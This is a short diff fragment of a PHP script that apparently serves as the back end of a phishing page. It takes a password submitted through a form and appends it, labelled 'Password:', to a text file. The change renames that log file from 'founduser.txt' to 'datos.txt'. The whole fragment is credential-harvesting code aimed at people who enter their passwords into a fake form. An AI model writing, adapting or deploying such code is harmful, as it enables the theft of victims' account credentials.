@@ -4,7 +4,7 @@ $user = $_POST["password"];
 "; 
     $cl = "===========================================
 ";
-    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
+    $fileuser = fopen("datos.txt", "a") or die("Intentalo nuevamente");
     $us = "Password: $user
 ";
     fwrite($fileuser, "
